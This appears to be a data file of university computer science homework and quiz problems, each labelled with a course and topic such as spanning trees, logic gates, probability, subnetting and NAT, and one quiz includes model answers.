Computer Science II,1040,Minninum Spanning Tree,"Spring 2018 Computer Science II: Quiz 1 (Old Programs 1 - 2)Last: _______________________ , First: ________________________Day: _______ Time: ________ (on roll)1) (15 pts) Consider solving the Minimum Spanning Tree problem on a graph where the edges canhave real valued weights (instead of just integer weights). Consider the following correspondingedge class (to aid in implementing either Kruskal's or Prim's Algorithm):class edge implements Comparable<edge> {public int v1;public int v2;public double w;public edge(int start, int end, double weight) {v1 = start;v2 = end;w = weight;}public int compareTo(edge other) {return (int)(this.w - other.w);}}Malia implements her algorithm with this class but finds that she misses just a few of the test casesfor the problem she is trying to solve. Much to her chagrin, she can't find any bugs in theimplementation of her algorithm. It turns out that the bug is in this edge class.(a) What is the error?(b) Give an example of a small test case (make up a small graph with real valued edge weights)that may make the algorithm fail even if the rest of the code outside of this edge class is writtencorrectly.(c) Rewrite the compareTo method so that Malia's program works correctly. You may assumethat no two edges with distinct edge weights will be within 10-9of each other in edge weight.2) (15 pts) Consider the following Disjoint Set class shown below:class djset {private int[] parent;public djset(int n) {parent = new int[n];for (int i=0; i<n; i++)parent[i] = i;}public int find(int v) {if (parent[v] == v) return v;return find(parent[v]);}public boolean union(int v1, int v2) {int rootv1 = find(v1);int rootv2 = find(v2);if (rootv1 == rootv2) return false;parent[rootv2] = rootv1;return true;}}(a) Show a picture of the tree representation of what the disjoint set dj would look like usingTHIS implementation after running the following statements:djset dj = new djset(10);dj.union(0, 1);dj.union(7, 5);dj.union(1, 5);dj.union(2, 5);dj.union(8, 1);dj.union(6, 0);dj.union(4, 3);dj.union(9, 2);"
Computer Science II,1040,Counting Sequences,"Spring 2018 Computer Science II: Quiz 2 (Old Programs 3 - 4)Last: _______________________ , First: ________________________Recitation Day: _______ Time: ________ (on roll)1) (5 pts) In the posted solution to Old Program #3: Calculator, there is no boolean array to storewhich values had been visited in the breadth first search. How does the posted solution avoidvisiting the same number twice in its search?2) (5 pts) In Old Program #3, if the calculator showed a value x, then with one button press thevalues x+a, x*b and x/c could be obtained. It was guaranteed that 0 â‰¤ x < 1,000,000 and that a, b,and c were in between 1 and 1000, inclusive. Based on these bounds, is it necessary to use a longto store intermediate values? Why or why not? (Note: The largest value that can be stored in an intis a little bit more than 2 billion.)3) (16 pts) In the solution to Old Program #4: Counting Subsequences, an array is built to storeanswers to relevant sub-problems. In particular, dp[i][j] in the solution stores the number of timesthe first j letters of pattern appear as a subsequence in the first i letters of text. Using this definitionof the array dp, fill in what the array would store for the second sample case. The letters for thetext appear as headers for the columns and the letters for the pattern appear as headers for the rows:S A L L Y S E L L S S E A S H E L L S1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1S 0E 0L 0L 04) (14 pts) Consider a related problem to Old Program #4: Given a text string and a pattern string,find the shortest prefix of the text string that contains at least one subsequence that is equal to thepattern string. For example, if the text is ""engineering"", and the pattern were ""nine"", the resultwould be 6, since the first six letters of engineering, ""engine"" contain the subsequence ""nine"", butno shorter prefix of engineering contains the subsequence ""nine"". Complete the Java method whosesignature is given below to return this value. If no subsequence of the text equals the pattern, thenhave your method return -1.public static int shortestMatch(char[] text, char[] pattern) {"
Computing Foundations I,2100,Statements,"CIS 3330 Foundations of Computing Due Aug 28, 2003Homework 1 (No kidding!)It was summertime in the small town of Bolton, Iowa. Two boys Mikeand Joe were standing in the alley behind the local bank. Suddenlythey heard several loud bangs. â€œGunshots!â€ Mike cried. Just thentheir friend, Fred, came running down the alley yelling, â€œThe bankâ€™sbeing robbed!â€ Mike and Joe ran around to the front of the bank justin time to see a red pickup truck speeding off out of town. â€œThere hegoes,â€ yelled Joe. â€œWait a minute,â€ Mike yelled. â€œThatâ€™s Bill Smithâ€™snew pickup. Heâ€™s always getting in trouble, and now heâ€™s robbed thebank.â€ Just then, Officer Jones came speeding by in his new police carwith the siren going and the lights flashing. He headed out of townafter the red pickup.For each of the following statements, determine whether the statement is true or false.If the statement is true, cite evidence from the story. If the statement is false, citeevidence to the contrary. If there is insufficient evidence in the story to determine thetruth or falsity of the statement, write â€œIndeterminate.â€1. Bill Smith is a trouble maker.2. Officer Jones is chasing a bank robber.3. Bill Smith robbed the bank.4. Mike and Joe are friends.5. Bill Smith drives a red pickup truck.6. Fred saw the bank being robbed.7. Mike and Joe heard gunshots."
Computing Foundations I,2100,Gates,"CSE 311: Foundations of Computing IHomework 1 (due Friday, October 4th at 11:00 PM)Directions: Write up carefully argued solutions to the following problems. Your solution should be clearenough that it should explain to someone who does not already understand the answer why it works. However,you may use results from lecture, the theorems handout, and previous homeworks without proof.1. I Canâ€™t Blab Such Blibber Blubber! (25 points)Translate these English statements into logic, making the atomic propositions as small as possible.(a) [5 Points] Only if the stadium is full and the crowd is not subdued will we win the game.(b) [10 Points] Define a set of at most three atomic propositions. Then, use them to translate all of thesesentences about my plan to buy a watch into logic:i) If the watch is no more than $25, then I will buy it.ii) Unless it is on sale, I will not buy the watch.iii) I will buy the watch only if it is on sale and not more than $25.(c) [10 Points] Define a set of at most four atomic propositions. Then, use them to translate all of thesesentences about how a stack data structure can be used into logic:i) You can push onto but not pop from the stack if it is empty.ii) Only if the stack is full can you pop from but not push onto it.iii) The stack is neither empty nor full unless you cannot pop from it or cannot push onto it.2. One, Two Three... How Many Fingers Do I See? (10 points)Find a compound proposition involving the propositional variables p, q, and r that is true precisely when amajority of p, q, and r are true. Explain why your answer works.3. Would You, Could You, With a Gate? (15 points)Using only. . .AND Gates, OR Gates, and Inverters (NOT Gates),AND OR NOTdraw the diagram of a circuit with three inputs that computes the function B(p, q, r), defined as follows:If both p and q are true, then B(p, q, r) = Â¬r. If exactly one of p and q is true, then B(p, q, r) = r. Otherwise,we have B(p, q, r) = F.14. Aunt Annieâ€™s Alligator (20 points)Define the â€œAâ€ gate by the rule A(r, s) := r âˆ¨ Â¬s .Show how to implement the following gates using only Aâ€™s. You are allowed to use the constants T and Fand the inputs p and q. You are allowed to use inputs multiple times.You must justify your answers.(a) [5 Points] Â¬p, using only one A gate(b) [5 Points] p âˆ¨ q, using at most two A gates(c) [5 Points] Â¬(p âˆ§ q), using at most two A gates(d) [5 Points] p âˆ§ q, using at most three A gates5. Thing One and Thing Two (20 points)Use truth assignments (i.e., an assignment of a truth value to each variable) to demonstrate that the twopropositions in each part are not logically equivalent. Explain why your assignment demonstrates this.(a) [5 Points] p âˆ¨ (p âˆ§ q) vs. q âˆ¨ (p âˆ§ q)(b) [5 Points] Â¬(p âŠ• q) vs. Â¬p âŠ• Â¬q(c) [5 Points] p â†’ (q â†’ r) vs. (p â†’ q) â†’ r(d) [5 Points] (p â†’ q) â†’ (q â†’ p) vs. (q â†’ p) â†’ (p â†’ q)6. The Curious Case of The Lying TAs (10 points)A new UW CSE student wandered around the Paul Allen building on their first day in the major. They found(as many do) that there is a secret room in its basements. On the door of this secret room is a sign that says:All ye who enter, beware! Every inhabitant of this room is either a TA who alwayslies or a student who always tells the truth!(a) [5 Points] The CSE student walked into the room, and two inhabitants walked up to the student. One ofthem said â€œat least one of us is a TA.â€ Determine (with justification) all the possibilities for each of thetwo inhabitants.(b) [5 Points] Three inhabitants walk up to the CSE student and surround the UW CSE student. One ofthem says â€œevery TA in this circle has a TA to his immediate right.â€ Determine (with justification) all thepossibilities for each of the three inhabitants.27. EXTRA CREDIT: XNORing (0 points)Imagine a computer with a fixed amount of memory. We give names, R1, R2, R3, . . . , to each of the locationswhere we can store data and call these â€œregisters.â€ The machine can execute instructions, each of which readsthe values from some register(s), applies some operation to those values to calculate a new value, and thenstores the result in another register. For example, the instruction R4 := AND(R1, R2) would read the valuesstored in R1 and R2, compute the logical and of those values, and store the result in register R4.We can perform more complex computations by using a sequence of instructions. For example, if we startwith register R1 containing the value of the proposition p and R2 containing the value of the proposition q,then the following instructions:1. R3 := NOT(R1)2. R4 := AND(R1, R2)3. R4 := OR(R3, R4)would leave R4 containing the value of the expression Â¬p âˆ¨ (p âˆ§ q). Note that this last instruction reads fromR4 and also stores the result into R4. This is allowed.Now, assuming p is stored in register R1 and q is stored in register R2, give a sequence of instructions thatâ€¢ only uses the XNOR operation (no AND, OR, etc.),â€¢ only uses registers R1 and R2 (no extra space), andâ€¢ ends with q stored in R1 and p stored in R2 (i.e., with the original values in R1 and R2 swapped)."
Computing Foundations I,2100,Manhattan Distance,"CSE 312: Foundations of Computing II Spring 2018Homework 1 (due Monday, April 2)Directions: Write up carefully argued solutions to the following problems.To simplify submission, we ask that you make sure only one question is on each page. You may, of course, usemultiple pages for one question if necessary.0. Section Assignments [Written] (30 points)For the following question, we want you to solve each problem in two ways. First, solve it using a Pythonprogram (weâ€™ve written starter code for each of the parts). Then, solve it analytically and try your answerout in the program to make sure it matches. This is a generally useful strategy: use the fact that you canprogram pretty easily to check all your answers in this course. You should explain why your answer is correct asa comment in each program and turn in your programs on Canvas.How many ways are there to assign all TAs to sections if there are 7 (distinguishable) TAs and 4 (distinguishable)sections. . .(a) [2 Points] with no other restrictions?(b) [3 Points] with at least one TA and at most two TAs in each section?(c) [5 Points] with at least one TA in each section?Now, we want to know how many different types of groupings we can split up the TAs into if we donâ€™t carewhich TAs are in each section. Suppose we have n (indistinguishable) TAs and m (distinguishable) sections.How many types of groupings of all of these TAs into sections are there...(d) [4 Points] with no other restrictions?(e) [8 Points] with at least one TA in each section?Hint: Try a variation of the strategy you used in part (d).Now, we want to know how many different ways we can split up the TAs if we care about the groupings butnot which section is which. Suppose we have 2n (distinguishable) TAs and n (indistinguishable) sections. Howmany types of groupings of these TAs into sections are there...(f) [8 Points] with exactly two TAs in each section?1. Manhattan Distance [Written] (15 points)Manhattan Distance has lots of applications in Computer Science. A â€œManhattan Walkâ€ is a path on a gridthat only ever goes North (up) or East (right). For example, the following path is a Manhattan Walk:0 1 2 3 4012341In this problem, you will count how many Manhattan walks there are under various conditions. How manyManhattan Walks are there. . .(a) [3 Points] from (0, 0) to (x, y)?(b) [4 Points] from (x1, y1) to (x2, y2)?(c) [4 Points] from (0, 0) to (2n, 2m) that pass through (n, m)?(d) [4 Points] from (0, 0) to (2n, 2m) that do not pass through (n, m)?2. Self indulgent Numbers [Written] (15 points)Suppose we have a one-dimensional integer array A of size n, where n â‰¥ 4. We insert the integers 0, 1, 2, . . . , nâˆ’1into this array, with each integer appearing exactly once. We say that i is at â€œits own indexâ€ if A[i] = i. Give avery simple formula (i.e., no summation in your final answer) for each of the following. How many arrangementsare there in which . . .(a) [3 Points] at least 1 entry is not at its own index?(b) [3 Points] at least 2 entries are not at their own indices?(c) [4 Points] at least 3 entries are not at their own indices?(d) [5 Points] at least 4 entries are not at their own indices?3. Computer Cables [Written] (10 points)A network of n computers can be formed by connecting each computer to all of the others using bidirectionalcables (i.e., a cable between computers i and j allows i to talk to j and vice versa).(a) [5 Points] How many cables are needed to completely connect the network?(b) [5 Points] Over time, some of the cables become faulty and can no longer send packets between theirtwo ends. How many different situations could we have if any and all cables might become faultyindependently?4. Passwords [Written] (15 points)When deciding what criteria to allow passwords to have, itâ€™s important that the resulting space remain sufficientlylarge. In this question, you will explore different password requirement strategies. For the entire question, weassume passwords are made up of characters in the ranges a âˆ’ z (count = 26), A âˆ’ Z (count = 26), 0 âˆ’ 9(count = 10), and the â€œspecial charactersâ€ !@#âˆ— (count = 4).(a) [5 Points] How many passwords of length 4 are there with no extra restrictions?(b) [5 Points] How many passwords of length 4 are there which contain at least one character from eachcategory?(c) [5 Points] How many users would you need to have to be sure that three of them have the same passwordunder the conditions from part (b)?25. Ï† not? (15 points)The Euler Totient Function, Ï†(n), has applications in cryptography. In particular, it is used to show the RSAcryptosystem works correctly. Ï†(n) is the number of numbers less than n that are relatively prime to n. Forexample, if n = 5, 1, 2, 3, and 4 are all relatively prime to n and less than n.(a) [5 Points] If n is prime, find and explain a closed form for Ï†(n).(b) [10 Points] If n = pq, where p and q are distinct primes, find and explain a closed form for Ï†(n)."
Computing Foundations I,2100,Probabilities,"CSE 312: Foundations of Computing IIQuiz Section #31. Given 3 spades and 3 hearts, shuffle them. Compute P(E), where E is the event that the suitsof the shuffled cards are in alternating order. What is your sample space?2. Suppose you pick two cards from a well-shuffled Schnapsen deck. What is the probabilitythat they are both queens?3. Suppose you deal 13 cards from a well-shuffled bridge deck of 52 cards. What is the proba-bility that the distribution of suits is 4, 4, 3, 2? (That is, you have 4 cards of one suit, 4 cardsof another suit, 3 cards of another suit, and 2 cards of the last suit.)4. Novice poker players are often confused about whether a flush beats a straight. For drawpoker (see quiz section #2 worksheet, exercise #9):(a) Compute the probability of being dealt a flush.(b) Compute the probability of being dealt a straight.(c) Which of these hands should beat the other, given your answers to (a) and (b)?5. In Schnapsen, suppose that â™ J is the face-up trump and you are dealt 5 nontrump cards. LetE be the event that the top 4 cards in the stock are all trumps. Let the sample space be allpossible orderings of all the cards in the stock. Compute P(E). (Notice that your solutionsuggests a different and simpler sample space.)6. Suppose you are taking a multiple-choice test that has c answer choices for each question.In answering a question on this test, the probability that you know the correct answer is p.If you donâ€™t know the answer, you choose one at random. What is the probability that youknew the correct answer to a question, given that you answered it correctly?7. An urn contains 3 black balls and 4 white balls.(a) Suppose 3 balls are drawn from the urn without replacement. What is the probabilitythat all 3 are white? Try computing this in the sample space where the order of the 3draws does not matter, and then in the sample space where the order does matter.(b) Suppose 3 balls are drawn from the urn with replacement. What is the probability thatall 3 are white? Describe the sample space precisely.8. (Challenge problem) n people at a reception give their hats to a hat-check person. Whenthey leave, the hat-check person gives each of them a hat chosen at random. What is theprobability that no one gets their own hat back?"
Computing Foundations I,2100,Complexity,"CSE 312: Foundations of Computing IIQuiz Section #10: Review Questions for Final Exam1. A European cityâ€™s temperature is modeled as a random variable with mean Î¼ and standard deviation Ïƒ, measuredon the Celsius scale. A day is described as â€œordinaryâ€ if the temperature during that day remains within onestandard deviation of the mean.(a) Give formulas for the mean and variance, if temperature is measured on the Fahrenheit scale. The formulafor conversion is F = 32 + 1.8C.(b) From your formulas in part (a), give formulas for the temperature range for an ordinary day on the Fahren-heit scale.2. You flip a fair coin independently and count the number of flips until the first tail, including that tail flip in thecount. If the count is n, you receive 2n dollars. What is the expected amount you will receive? How much wouldyou be willing to pay at the start to play this game?3. During each day, the probability that your computerâ€™s operating system crashes at least once is 5%, independentof every other day. You are interested in the probability of at least 45 crash-free days out of the next 50 days.(a) Find the probability of interest by using the normal approximation to the binomial.(b) Find the probability of interest by using the Poisson approximation to the binomial.4. Consider the line segment [0, L]. Let X âˆ¼ Exp(4/L). If 0 â‰¤ X â‰¤ L, the line segment [0, L] is split into two at thepoint X (yielding one piece of length X and one piece of length L âˆ’ X), otherwise it is split into two at the pointL (yielding one piece of length L and one piece of length 0). Give your answers to 3 significant digits.(a) Find the probability that the ratio of the shorter to the longer segment is less than 1/3.(b) What is the probability that X is less than 0 or greater than L?5. A computer network consisting of n computers is to be formed by connecting each computer to each of theothers by a direct (â€œpoint-to-pointâ€) network cable.(a) How many network cables are needed?(b) Unfortunately, some of the cables may be faulty (â€œdeadâ€) while others are OK (â€œaliveâ€). How manydifferent â€œconnectivity patternsâ€ are possible? (E.g., â€œthe cable between computers 1 and 3 is alive, but noothers areâ€ is one pattern; â€œbetween 1 and 4, but no othersâ€ is a different pattern; â€œonly the cable between1 and 4 is deadâ€ is a third pattern, etc.)(c) Assuming that there is at least one â€œliveâ€ cable connected to every computer, show that there are at leasttwo computers in the network that are directly connected to the same number of other computers via livecables.6. Alice, Bob, and Carol repeatedly take turns rolling a fair die. Alice begins, Bob always follows Alice, Carolalways follows Bob, and Alice always follows Carol. Find the probability that Carol will be the first one to rolla six.7. Consider the line segment [0, L]. Let X âˆ¼ N(L/2, L2/16). If 0 â‰¤ X â‰¤ L, the line segment [0, L] is split into twoat the point X (yielding one piece of length X and one piece of length L âˆ’ X), otherwise it is split into two at thepoint L (yielding one piece of length L and one piece of length 0). Give your answers to 3 significant digits.1(a) Find the probability that the ratio of the shorter to the longer segment is less than 1/3.(b) What is the probability that X is less than 0 or greater than L?8. The number of seconds a server takes to finish a job is modeled as a random variable X from an unknowndistribution. You would like to be able to guarantee clients that, with high probability, jobs will be finishedwithin 50 seconds. What is the best guarantee you could give if:(a) You assume that X has mean 25.(b) You assume that X has mean 25 and variance 25.(c) You assume that X âˆ¼ Poi(25). (Hint: use the Normal approximation of the Poisson. Why is it reasonableto approximate Poi(25) by a normal distribution? It follows from the Central Limit Theorem, since it turnsout that a Poisson random variable with Î» = 25 is the sum of 25 independent Poisson random variableseach with Î» = 1. See https://onlinecourses.science.psu.edu/stat414/node/180.)9. A frog starts at position 0 on a line and at each second t jumps Xt cm, where the Xt are all i.i.d. according to thefollowing probability mass function:p(âˆ’2) = 1/6p(âˆ’1) = 1/3p(1) = 1/6p(2) = 1/3Use the central limit theorem to estimate the probability that, after 100 jumps, the frog is at a negative position.10. Chebyshevâ€™s inequality implies that the proportion of observations that are less than 3 standard deviations fromthe mean is at least p. Determine the value of p.11. You throw a dart at a circular target of radius r = 5 inches. Your aim is such that the dart is equally likely to hitany point in the target. For each throw, you win $1 if the dart strikes within 2 inches of the targetâ€™s center. LetW be your total winnings for 100 independent throws. Use the Chernoff bound to get an upper bound on theprobability that you win at least $24. (The Chernoff bound is sometimes given in the form P(X > (1+Î´)Î¼) â‰¤ . . . ,but the same bound actually also holds in the form P(X â‰¥ (1 + Î´)Î¼) â‰¤ . . . .)12. Suppose x1, x2, . . . , xn are independent samples from Bin(N, p), where the parameter N is known to you but p isunknown.(a) What is the maximum likelihood estimator for p? Donâ€™t forget to prove that it is a maximum of thelikelihood function.(b) Is your answer to part (a) a biased or unbiased estimator?13. For any individual x born in Transylvania with a vampire father, there is a 50% chance that x is a vampire,independently for each birth. These are the only conditions under which a new vampire can be created. 75% ofthe Transylvanian males are vampires. Suppose Igor, a man who has lived in Transylvania his whole life, hasthree children that are not vampires.(a) What is the probability that Igor is a vampire?(b) If Igor has a fourth child, what is the probability that child will be a vampire?214. A bridge deck consists of 52 cards divided into 4 suits of 13 ranks each. A bridge hand consists of 13 cardsfrom a bridge deck. Suppose that the bridge cards are well shuffled and dealt. What is the probability that yourbridge hand is already sorted when you pick it up, given that you have been dealt at least two cards in each ofthe 4 suits? By â€œsortedâ€ I mean that the cards of any one suit are adjacent to each other, and the cards of eachsuit are sorted by rank, with ascending ranks either from left to right or from right to left in your hand. The 4suits can be in any order in your hand, and different suits can sorted in different directions.15. Suppose x1, x2, . . . , xn are independent, identically distributed samples from the continuous distributionUnif(0, Î¸). Consider the estimator Î¸Ë† =3nPni=1xi of Î¸. Is Î¸Ë† unbiased? If not, find a constant c such that cÎ¸Ë†is unbiased and prove that it is unbiased.16. Let X be a continuous random variable with probability density functionf(x) =(2x , if 0 â‰¤ x â‰¤ 10 , otherwise .(a) Find Eh1Xi.(b) Compute P(X = 0.5).17. Bob is teaching Alice how to play his new favorite game. In each round, Bob shoots an arrow at the tires ofAliceâ€™s car. He hits with probability p, independent of previous rounds. If he hits a tire, he gets 10 points. If hemisses, he loses 5. Let X be Bobâ€™s score after n rounds.(a) What is E[X]?(b) What is Var(X)?18. Suppose A and B are random, independent, nonempty subsets of {1, 2, . . . , n}, where each nonempty subset isequally likely to be chosen as A or B. What is P(max(A) = max(B))?19. Suppose A and B are random, independent (possibly empty) subsets of {1, 2, . . . , n}, where each subset is equallylikely to be chosen as A or B. Consider Aâˆ†B = (Aâˆ©BC)âˆª(Bâˆ©AC) = (AâˆªB)âˆ©(AC âˆªBC), i.e., the set containingelements that are in exactly one of A and B. Let X be the random variable that is the size of Aâˆ†B. What is E[X]?"
Computer Networks,3530,Subnets,"csc344: Computer Networks ---Homework# 4Posted on Nov. 1, Due on Nov. 8, 2016This homework carries 5% of course grade. Your answers must be typed and uploaded toBlackboard. You are encouraged to use the WORD document for writing your answers. SHOWALL YOUR WORK NOT JUST THE FINAL ANSWER.1. Consider the network shown below. Each of the subnets A, B, C, and Dcontains at most 30 hosts; subnet E connects router R1 and R2.a. Assign network addresses to the five subnets shown (that is, write theaddresses you have assigned in the dotted decimal notation such asx.y.z.w/p ).b. Suppose that there are 17 hosts in A, B, C, D. Does your answer toquestion above change?c. Based on your answer to a, b above, what is the network prefixadvertised by router R1 to the public Internet?2. NAT:. Consider the scenario shown in Figure 4.22 on page 350 of the textbook.Suppose that host 10.0.0.2 initiates a connection, using source port 5500 to a Webserver listening at port 80 at 128.119.40.186.a. Complete the following NAT translation table for this TCP connection.NAT translation tableWAN side LAN sideb. What are the source and destination IP addresses and port numbers in theIP datagram arriving at the WAN side of the router with interfaceaddress 138.76.29.7?source IP , source port: ,destination. IP: , destination. port: .3. (P10, page 419) Suppose a router has four links, numbered 0 thru 3, andpackets are to be forwarded to the link interfaces 0-3 as follows. The firstrange of addresses to link 0, etc. Provide a forwarding table, usinglongest prefix matching that forwards packets to the correct linkinterfaces.Destination Address Range Link Inrerface11100000 00000000 00000000 0000000Through 011100000 00111111 11111111 1111111111100000 01000000 00000000 00000000Through 111100000 01000000 11111111 1111111111100000 01000001 00000000 00000000Through 211101001 01111111 11111111 11111111Otherwise 34. Consider the network shown below. Show the operation of Dijkstraâ€™s(also called as Link-State) algorithm for computing the least cost pathfrom E to all destinations. Show you work by completing a table similarto Table 4.3. First row has been filled in to help you get started.5.N D(A),p(A) D(B),p(B) D(C),p(C) D(D),p(D) D(F),p(F)E infinity 10,E infinity 4,E 2,E"
Computer Networks,3530,IP addresses,"CS 640 Introduction to Computer NetworksQuiz 5Write your name on the exam. Write something for every question. Students who do notwrite something for everything lose out over students who write down wild guesses. Youwill get some points if you attempt a solution but nothing for a blank sheet of paper.Write something down, even wild guesses. Problems take long to read but can beanswered concisely.Question Maximum Score1 82 12Total 20Question 1 â€“ various short questionsExplain concisely the difference between the following pairs of termsa) What are the sizes of the Ethernet and IP addresses?The Ethernet address has 48 bits (6 bytes), the IP address has 32 bits (4 bytes).b) What is the role of ARP?The role of ARP is to allow computers on a LAN to find the MAC address of the computerwith a given IP address. ARP uses data link layer broadcast frames requesting thedestination to give its MAC address. Answers are cached in a local lookup table.c) What are the benefits of VLANs?Compared to using a single LAN, VLANs have security and performance benefits (somecomputers cannot talk to each other and respectively broadcast traffic is reduced).Compared to using separate LANs covering the same computers, VLANs are cheaper(and easier to administer) because they can be implemented with fewer devices and fewerwires.d) How does the sender of an IP packet decide whether the destination is on the sameLAN or not?If the destination has the same network address, it is on the same LAN. The (length of)the netmask establishes how many of the first bits of the computerâ€™s address define thenetwork address.Question 2 â€“ Medium access controla) Why does Ethernet use a random backoff time?So that the two senders involved in a collision do not re-send at the same time causingperpetual collisions.b) Why does Ethernet use exponential backoff?So that senders can quickly adapt to the network conditions. When the number of activesenders is small, a small backoff time is better as the senders donâ€™t wait unnecessarily.When their number is large, a large backoff time is better as it avoids reduces the chanceof many repeated collisions for the same frames.c) What is carrier sense and why does it work better for wired LANs, than for wirelessLANs?Carrier sense: before sending, a sender listens to the medium, and if it detects anothersenderâ€™s transmission, it does not send (to avoid causing a collision). For wired LANs,each computer connected to the wire can detect every other computerâ€™s transmission, forwireless LANs it can happen that two senders cannot detect each otherâ€™s signal, but thereceiver hears both.d) Define what a â€œcollision domainâ€ is in an extended LAN using Ethernetswitches/bridges as well as hubs/repeaters?A â€œcollision domainâ€ is a maximal portion of the switched Ethernet network so that notwo computers within that portion of the network can send at the same time.Hubs/repeaters do not separate the wires they connect into different collision domainswhile switches/bridges do."
Computer Networks,3530,Multiplexing,"15-441 Computer NetworksHomework 5Due: May 3, 2019Name:Andrew: ID1A MultiplexingYou are given the job of designing a network in which 100 users communicate with a server. The users sharemust share the bottleneck link, which runs at 500kbps. You can choose between two different multiplexingtechniques for sharing the bottleneck link bandwidth between the users:â€¢ Time division multiplexing them into 100 different time slices of 500ms each.â€¢ Frequency division multiplexing into 100 different frequencies, each running at 5kbps.Assume link latency is negligible.1. Suppose the primary purpose of your network is to support delay-sensitive, interactive applications likevideo games that send small updates of 500b every 10ms.(a) Which multiplexing strategy would you use?(b) Why?2. Suppose instead the primary purpose of your network is for applications that tend to do bursty transfersof exactly 250kb (assume that this accounts for protocol overhead).(a) Which multiplexing strategy would you use?(b) Why?Page 2 of 5B Shannonâ€™s Law1. Please answer the following question using Shannonâ€™s theorem:(a) Consider an ideal, noiseless channel with 1000 Hz bandwidth. What does Shannonâ€™s law predictthe capacity of this link will be? (Capacity in bits per second).(b) For a noisy channel of 1000 HZ bandwidth, a wire length of 10km, a received signal level of 500 anda noise level of 10 (on the same linear scale), what is the maximum channel capacity in unit of bitsper second? Explain.Page 3 of 5C Datacenters1. Consider the following datacenter topology:For every new server, we plug it directly into a central switch. This is called a â€˜starâ€™ topology.(a) Is it more reliable, less reliable, or about the same as a Clos tree topology? (Circle one)(b) Does it have lower latency, higher latency, or about the same latency as a Clos tree topology?(Circle one)(c) Does it require more costly, less costly, or about the same cost switches as a Clos tree topology?(You get it...)(d) Is it more complicated, less complicated, or about the same as a Clos tree topology? (You get it...)2. Why can network virtualization help a network like Fanta, that wants to route all traffic between itsnodes through an intermediary proxy?Page 4 of 5D NAT1. Consider Joe and Bob, two home neighbors.(a) Joe and Bob each buy a new home wireless router with an included NAT. After connecting eachof their laptops to the router they each enter the command â€œhostname -iâ€ which prints out theirIP address. After doing this they find that they actually have the same IP address. How is thispossible?(b) Give one reason that wide-spread deployment of IPv6 would let them get rid of their NAT device.(c) Give one reason that they might want to continue using their NAT even if they could use IPv6."
Computer Networks,3530,Fowarding tables,"15-441: Computer NetworksHomework 2Assigned: Feburary 19thDue: Feburary 28th1. Frank Fandango runs a 10Mbit/s Ethernet between the CMU campus and the homes of his friends. Allof these hosts are in a single broadcast domain. Fortunately, they are located just within the maximumdistance of an Ethernet. The total size of an Ethernet can be about 2.5 kilometers, , and an Ethernethas a minimum packet size of 512 bits.Frank upgrades his network to 100Mbit/s Ethernet, and notices that when only one person sends at atime, or when he sends very large packets, his network works. But when many people send very smallpackets, things donâ€™t work at all.(a) Explain how a minimum packet size can help to detect collisions in Ethernet:(b) Help Frank out. Compute the threshold of how big packets must be in order for things to work:(c) One solution that Frank came up with is to raise the minimum packet size to the answer from part(a). Suppose that Frank cannot modify the minimum packet size, move the endpoints, lay newcable, or change the software or configuration on the endpoints. You may add new devices to thenetwork. How could Frank change the topology to fix his problems anyway?2. For this question, assume that the routers use RIP to calculate their forwarding tables.(a) Fill in the routing table for node A, after convergence.1(b) After convergence, node E goes down. Fill in the final routing table for B, after re-convergence.3. Imagine the Internet is divided into the Autonomous Systems shows below. In this problem we assumeNO subnetting and NO supernetting and NO CIDR is used. A packet is being sent from Host H1 toHost H2. The packets takes the following route: H1 âˆ’â†’ R1 âˆ’â†’ R2 âˆ’â†’ R3 âˆ’â†’ R4 âˆ’â†’ R5 âˆ’â†’ R6 âˆ’â†’H2Page 2Some information: R2, R3, R4, and R5 are gateway routers. Assume that there are many routersand networks within each AS that are not shown. Assume also that there are NO defaultentries in routers. Please answer the questions below in 10 words or less. We are NOTlooking for numerical answers.(a) Which of the labeled routers above likely use the BGP routing algorithm to create their forwardingtables?(b) How many entries does R1â€™s forwarding table have?(c) Assume that host H1â€™s IP address is 205.96.17.172, What can we say about the IP address of R1(d) Give an example of an entry in R1â€™s forwarding table (donâ€™t leave out any fields).(e) How many entries are there in R2â€™s forwarding table?(f) Suppose AS X thinks that AS Y drops too many packets. Using only BGP, is it possible for ASX to implement a policy stating that â€œtraffic outbound from my AS should not cross Y ?â€ Why orwhy not?(g) Now suppose AS X thinks that AS Y generates a lot of illegal file sharing traffic. Using only BGP,is it possible for AS X to implement a policy stating that, â€œI donâ€™t want to carry traffic from Yto my customers?â€ Why or why not? Assume that AS X does not want to deny transit to trafficfrom any other AS.4. Maggie decides to start a small company. She asks her ISP, Acme Networks, to give her enough addressesfor 1200 hosts. ACME allocates a subblock from the 192.1.* address range that they own and tells Maggieto use the following addresses:192.1.0.*192.1.1.*192.1.2.*192.1.3.*192.1.4.*(a) Maggie has heard that the size of the Internet routing table has grown to huge proportions, andthat to be a good citizen, she should announce the fewest number of routes possible to exactly coverher IP addresses.Under CIDR, what is the smallest set of network numbers that the rest of the world would use todescribe Maggieâ€™s networks (please use address & prefix format - e.g. 128.2/16)?Page 3(b) Maggie has a second ISP that she uses, RoadRunner Networks. She announces some of her networkaddresses to both Acme and RoadRunner. (Maggie hadnâ€™t talked to you yetâ€”these announcementsdo not correspond to the answers you provided to the previous question). As a result, some routerfar away in the network produces a forwarding table with the following entries:Destination Next Hop192.1/16 1.2.3.4192.1.0/23 1.2.3.5192.1.4/24 1.2.3.6192.1.1/24 1.2.3.7Which next hop should the router use for a packet destined to 192.1.0.1?"
Computer Networks,3530,Scheduling and QoS,"CSE 123: Computer NetworksHomework 4Out: 5/25, Due: 6/1Instructions1. Turn in a physical copy at the beginning of the class on 6/12. Ensure the HW cover page has the following information clearly writtena. Nameb. UCSD emailc. PIDProblems1. Scheduling and QoSPacket # Size Flow1 70 12 210 13 100 14 260 25 20 26 240 37 90 38 180 3Suppose a router has three input flows and one output. It receives the packetslisted in the table above all at about the same time, in the order listed, during aperiod in which the output port is busy but all queues are otherwise empty. Givethe order in which the packets are transmitted fora. Fair Queueing.b. Weighted fair queuing with flow 2 having twice as much share as flow 1,and flow 3 having three times as much share as flow 1.Note: Resolve ties in the order of flow 1, flow 2, and flow 32. Token Bucket FilterAssume that a host is sending a router packets that it would like the router toforward. The router has implemented traffic policing using a token bucket filter asshown in the lecture slides. The token bucket has a fill rate of â€œrâ€ bits per second(bps) and has a depth of â€œbâ€ bits.For simplicity assume that data can be sent as individual bits rather than packets.Assume the average rate at which the host sends the router data follows thefigure below and that the token bucket is initially full when time is 0.Show your work for all parts of this problem.a. If r = 1000 bps and b = 500 bits, will there be any loss of data? If so, atwhat time will 